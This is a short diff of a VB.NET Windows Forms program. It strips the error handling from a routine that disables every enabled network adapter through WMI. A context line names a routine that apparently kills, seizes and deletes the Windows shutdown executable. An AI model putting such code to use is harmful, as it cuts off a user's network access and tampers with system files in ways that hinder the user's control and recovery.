@@ -647,20 +647,16 @@ Public Class Form1
 
     ' Disconnect the Internet by disabling all network adapters
     Private Sub DisconnectInternet()
-        Try
-            Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
-            Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()
+        Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
+        Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()
 
-            For Each adapter As ManagementObject In networkAdapters
-                If CBool(adapter("NetEnabled")) Then
-                    ' Disable the network adapter
-                    adapter.InvokeMethod("Disable", Nothing)
-                    Console.WriteLine($"Disabled adapter: {adapter("Name")}")
-                End If
-            Next
-        Catch ex As Exception
-            MessageBox.Show("Failed to disable network adapters: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
+        For Each adapter As ManagementObject In networkAdapters
+            If CBool(adapter("NetEnabled")) Then
+                ' Disable the network adapter
+                adapter.InvokeMethod("Disable", Nothing)
+                Console.WriteLine($"Disabled adapter: {adapter("Name")}")
+            End If
+        Next
     End Sub
 
     Public Sub KillGrantAccessAndDeleteShutdownExe()
